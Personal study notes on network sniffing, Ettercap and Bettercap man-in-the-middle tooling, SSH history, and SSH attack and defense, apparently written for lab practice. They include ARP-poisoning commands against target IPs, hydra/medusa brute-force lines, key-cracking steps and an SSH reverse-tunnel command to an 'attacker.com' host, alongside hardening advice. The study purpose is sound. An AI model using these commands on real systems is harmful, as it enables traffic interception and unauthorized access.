---
Main Topic: Network_Security
Sub Topic: Protocols_and_Servers_2_PN
Links:
Date: 03-04-2026
Related Notes:
Tags:
---

# Protocols_and_Servers_2_PN
# Cybersecurity Notes

---

## Network Sniffing — Do You Only See Your Own Traffic?

Wireshark and tcpdump by default only capture packets coming to and from your own device. To see other people's traffic, two conditions must be met: **promiscuous mode** and **the right network topology**.

### Promiscuous Mode
A NIC normally discards packets not addressed to it. In promiscuous mode, it captures all frames it sees. Wireshark/tcpdump enable this automatically. But this alone is not enough.

### The Network Topology Problem

| Topology | Situation |
|---|---|
| **Hub** | Sends the packet to all ports — promiscuous mode is sufficient |
| **Switch** | Sends the packet only to the correct port — promiscuous mode is not enough |

Modern networks use switches. TryHackMe labs provide either a hub simulation or a pre-positioned MITM setup.

### Traffic Capture Methods in a Switched Environment

**ARP Spoofing / ARP Poisoning:**
Fake ARP replies are sent to the victim and the gateway, routing traffic through the attacker.
Tools: `arpspoof`, `ettercap`, `bettercap`

**MAC Flooding:**
The switch's CAM table is flooded, causing the switch to fall back to hub mode.
Tool: `macof`

**Port Mirroring (SPAN):**
Traffic from one port is copied to another via the switch management panel. Requires admin access to the switch. A blue team / sysadmin technique.

---

## Wiretap and Port Monitoring

### Wiretap (Physical / Passive Interception)
Direct access to the physical medium through which traffic passes.

- **Ethernet tap:** A physical network tap device is inserted inline — traffic keeps flowing while the tap silently copies it. Nearly impossible to detect.
- **Fiber tap:** The fiber cable is bent, and the leaking light is captured. State-level capability.
- **Wi-Fi monitor mode:** The NIC is placed in monitor mode, capturing all 802.11 frames in the air without being associated to any network. Tools: `airmon-ng`, `airodump-ng`

### Port Monitoring / Port Mirroring
A software-level solution on the switch. Traffic from one port is copied to another via the switch management panel, and your machine is connected to that port. IDS/IPS systems are fed this way.

### Monitor Mode vs Promiscuous Mode

| | Promiscuous Mode | Monitor Mode |
|---|---|---|
| Layer | Layer 2, connected network | Layer 1, full RF environment |
| Requires association? | Yes | No |
| What it captures | Frames on your own network | All 802.11 frames in the air |
| Use case | Ethernet sniffing | Wi-Fi analysis |

---

## Ettercap and Bettercap

### Ettercap
An old but classic MITM framework (around since 2001). Has GUI (`ettercap -G`), terminal (`-T`), and ncurses (`-C`) modes.

**Features:** ARP poisoning, DNS spoofing, SSL stripping, packet filtering, plugin system

```bash
ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.105//
# First IP = gateway, Second IP = target
```

**Weaknesses:** Active development has slowed down, struggles against modern SSL/TLS.

### Bettercap
The modern successor to Ettercap, written in Go.

**Features:** ARP, DNS, HTTPS, HSTS bypass, Wi-Fi, BLE attacks, Web UI, modular architecture

```bash
bettercap -iface eth0

# Inside the shell:
net.probe on                        # Discover devices on the network
net.show                            # List them
set arp.spoof.targets 192.168.1.105
arp.spoof on                        # Start ARP poisoning
net.sniff on                        # Start capturing traffic
```

**Caplet (script) system:**
```bash
# mitm.cap
net.probe on
set arp.spoof.targets 192.168.1.105
arp.spoof on
net.sniff on

bettercap -iface eth0 -caplet mitm.cap
```

### Comparison

| | Ettercap | Bettercap |
|---|---|---|
| Language | C | Go |
| Active development | No | Yes |
| Wi-Fi attacks | No | Yes |
| BLE | No | Yes |
| Web UI | No | Yes |
| Learning curve | Low | Medium |

---

## What is Ncurses?

A UI library that runs inside a terminal. Not a full GUI, not a plain command line — something in between. Provides boxes, menus, colors, and cursor control within the terminal.

Opened in Ettercap with the `-C` flag:
```bash
ettercap -C
```

**Why it exists:** When connected to a remote server via SSH, you can't open a GUI without X11 forwarding. Ncurses provides a usable interface entirely through the terminal.

**Other examples:** `htop`, `nano`, `nmtui`, `alsamixer`

---

## 3 Ways to Invoke Bettercap

**1. Interactive Mode:**
```bash
bettercap -iface eth0
```
Opens a shell where commands are entered one by one.

**2. Caplet (Script) Mode:**
```bash
bettercap -iface eth0 -caplet mitm.cap
```
Runs a pre-written `.cap` script file. Ideal for automation.

**3. Inline (Single Command):**
```bash
bettercap -iface eth0 -eval "net.probe on; arp.spoof on"
```
Commands are sent directly via `-eval` without opening a shell.

---

## What is SSH, How Did It Emerge, and Why Was It Universally Adopted?

### Origins
Developed in 1995 by Finnish researcher **Tatu Ylönen**. After experiencing a network attack at the University of Helsinki — someone was sniffing passwords on the network — he wrote a secure alternative. Developed in **C**.

At the time, protocols like telnet, rlogin, and rsh had no encryption whatsoever. Within days of Ylönen releasing SSH on the internet, thousands of downloads poured in. By year's end it had reached 20,000+ users across more than 50 countries.

### From SSH-1 to SSH-2
SSH-1 had cryptographic weaknesses. When the protocol was handed over to a commercial company, licensing restrictions began. In response, **OpenSSH** was forked by the OpenBSD team in 1999. The `ssh` command you use today is almost certainly OpenSSH.

**SSH-2** was standardized in 2006 as RFC 4251-4254. Incompatible with SSH-1 at the protocol level, and significantly more robust.

### Why Was It Adopted Without Question?
- **Timing:** The internet was exploding in growth, and the dangers of telnet were being exposed at exactly that moment
- **OpenSSH:** Eliminated the commercial licensing problem and got integrated everywhere
- **Technical soundness:** Asymmetric cryptography (RSA, ECDSA, Ed25519) + symmetric encryption (AES) + HMAC
- **Versatility:** Terminal access, SCP/SFTP, port forwarding, X11 forwarding, jump hosts

### Alternatives

| Protocol | Status | Problem |
|---|---|---|
| Telnet | Dead | No encryption |
| rlogin / rsh | Dead | No encryption, insecure |
| Mosh | Active | Built on top of SSH — complements it, doesn't replace it |
| WireGuard | Different purpose | VPN protocol |

---

## SSH — Attack and Defense

### Attack Side

#### 1. Brute Force / Dictionary Attack
The most common attack. If SSH allows password authentication, username + password combinations are tried.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh
```

#### 2. Username Enumeration
Before OpenSSH 7.7, response times differed for valid vs invalid usernames. Usernames could be identified through timing analysis.

**CVE-2018-15473**
```bash
python3 ssh_enum.py 192.168.1.10 wordlist.txt
```

#### 3. Private Key Theft
If `~/.ssh/id_rsa` is obtained via LFI, a web shell, or another vector, direct access is possible.
```bash
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.10
```
If the key is passphrase-protected:
```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
```

#### 4. SSH Tunneling (C2 Concealment)
If the firewall allows SSH, C2 traffic can be routed through an SSH tunnel.

**Local Port Forwarding:**
```bash
ssh -L 8080:internal-server:80 user@jumphost
```

**Remote Port Forwarding (Reverse Shell):**
```bash
ssh -R 4444:localhost:4444 attacker@attacker.com
```

**Dynamic / SOCKS Proxy:**
```bash
ssh -D 9050 user@192.168.1.10
# Combined with proxychains
```

#### 5. Host Key Spoofing / MITM
From a MITM position, a fake SSH server is stood up. The user receives a "host key changed" warning.

Tool: **ssh-mitm**

---

### Defense Side

#### 1. Disable Password Authentication
`/etc/ssh/sshd_config`:
```
PasswordAuthentication no
PubkeyAuthentication yes
```

#### 2. Disable Root Login
```
PermitRootLogin no
```

#### 3. Change the Port
```
Port 2222
```
Blocks script kiddie scans and reduces log noise.

#### 4. Fail2Ban
```bash
apt install fail2ban
```
```ini
[sshd]
maxretry = 3
bantime = 3600
```

#### 5. AllowUsers
```
AllowUsers ertugrul deploy
```

#### 6. Known_Hosts Management
An unexpected key change can be a signal of MITM.

---

### Summary Table

| Attack | Tool | Defense |
|---|---|---|
| Brute force | hydra, medusa | Key-only auth |
| Username enum | CVE-2018-15473 | Keep OpenSSH updated |
| Key theft | LFI, web shell | File permissions, MFA |
| C2 tunneling | -L -R -D flags | Egress filtering, IDS |
| MITM | ssh-mitm | Known hosts verification |
